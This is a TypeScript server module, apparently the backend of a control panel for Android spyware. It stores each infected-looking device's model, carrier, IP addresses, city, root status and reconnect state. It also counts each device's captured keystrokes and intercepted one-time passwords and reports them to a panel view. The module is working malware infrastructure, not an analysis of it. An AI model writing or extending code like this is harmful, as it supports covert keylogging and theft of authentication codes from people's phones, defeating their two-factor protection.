import { desc, eq } from 'drizzle-orm';
import type { DeviceInfo, DeviceStatus, DeviceSummary } from '@xrc/shared';
import { getDb } from '../db/index.js';
import { devices, type DeviceRow } from '../db/schema.js';

const counters = new Map<string, { keys: number; otps: number }>();

/** Format a DB real (number) as the string the panel expects. */
function numToStr(n: number): string {
  return Number.isInteger(n) ? String(n) : n.toFixed(1);
}

export interface DeviceUpsert {
  id: string;
  name?: string;
  model?: string;
  manufacturer?: string;
  android?: string;
  sdk?: number;
  carrier?: string;
  signal?: number;
  battery?: number;
  temp?: number;
  ramUsed?: number;
  ramTotal?: number;
  storageFree?: number;
  storageTotal?: number;
  ipLocal?: string;
  ipPublic?: string;
  city?: string | null;
  skin?: string | null;
  rooted?: boolean;
  status?: DeviceStatus;
  reconnectAttempts?: number;
  lastSeen?: number;
}

export function upsertDevice(input: DeviceUpsert): DeviceRow {
  const db = getDb();
  const existing = db.select().from(devices).where(eq(devices.id, input.id)).get();
  const now = input.lastSeen ?? Date.now();
  if (existing) {
    db.update(devices)
      .set({ ...(input as Partial<typeof devices.$inferInsert>), lastSeen: now })
      .where(eq(devices.id, input.id))
      .run();
  } else {
    db.insert(devices)
      .values({
        id: input.id,
        name: input.name ?? input.id,
        model: input.model ?? 'unknown',
        manufacturer: input.manufacturer ?? 'unknown',
        android: input.android ?? 'unknown',
        sdk: input.sdk ?? 0,
        carrier: input.carrier ?? 'unknown',
        signal: input.signal ?? 0,
        battery: input.battery ?? 0,
        temp: input.temp ?? 0,
        ramUsed: input.ramUsed ?? 0,
        ramTotal: input.ramTotal ?? 0,
        storageFree: input.storageFree ?? 0,
        storageTotal: input.storageTotal ?? 0,
        ipLocal: input.ipLocal ?? '',
        ipPublic: input.ipPublic ?? '',
        city: input.city ?? null,
        skin: input.skin ?? null,
        rooted: input.rooted ?? false,
        status: input.status ?? 'online',
        reconnectAttempts: 0,
        firstSeen: now,
        lastSeen: now,
      })
      .run();
  }
  return db.select().from(devices).where(eq(devices.id, input.id)).get() as DeviceRow;
}

export function setDeviceStatus(id: string, status: DeviceStatus): void {
  const db = getDb();
  db.update(devices).set({ status, lastSeen: Date.now() }).where(eq(devices.id, id)).run();
}

export function setReconnectAttempts(id: string, attempts: number): void {
  const db = getDb();
  db.update(devices).set({ reconnectAttempts: attempts }).where(eq(devices.id, id)).run();
}

export function bumpCounter(id: string, kind: 'keys' | 'otps'): void {
  const c = counters.get(id) ?? { keys: 0, otps: 0 };
  if (kind === 'keys') c.keys++;
  else c.otps++;
  counters.set(id, c);
}

export function listDeviceSummaries(): DeviceSummary[] {
  const db = getDb();
  const rows = db.select().from(devices).orderBy(desc(devices.lastSeen)).all();
  return rows.map((r) => {
    const c = counters.get(r.id) ?? { keys: 0, otps: 0 };
    return {
      id: r.id,
      name: r.name,
      model: r.model,
      android: r.android,
      status: r.status as DeviceStatus,
      battery: r.battery,
      signal: r.signal,
      keylogCount: c.keys,
      otpCount: c.otps,
      lastSeen: r.lastSeen,
    };
  });
}

export function getDeviceById(id: string): DeviceInfo | null {
  const db = getDb();
  const r = db.select().from(devices).where(eq(devices.id, id)).get();
  if (!r) return null;
  const c = counters.get(id) ?? { keys: 0, otps: 0 };
  return {
    id: r.id,
    name: r.name,
    model: r.model,
    brand: r.manufacturer,
    android: r.android,
    sdk: r.sdk,
    rooted: r.rooted,
    lastSeen: r.lastSeen,
    battery: r.battery,
    temperature: r.temp,
    ramFree: numToStr(Math.max(0, r.ramTotal - r.ramUsed)),
    storageFree: numToStr(r.storageFree),
    carrier: r.carrier,
    signal: r.signal,
    localIp: r.ipLocal,
    publicIp: r.ipPublic,
    keylogCount: c.keys,
    otpCount: c.otps,
  };
}

export function deleteDevice(id: string): boolean {
  const db = getDb();
  const existing = db.select().from(devices).where(eq(devices.id, id)).get();
  if (!existing) return false;
  db.delete(devices).where(eq(devices.id, id)).run();
  counters.delete(id);
  return true;
}
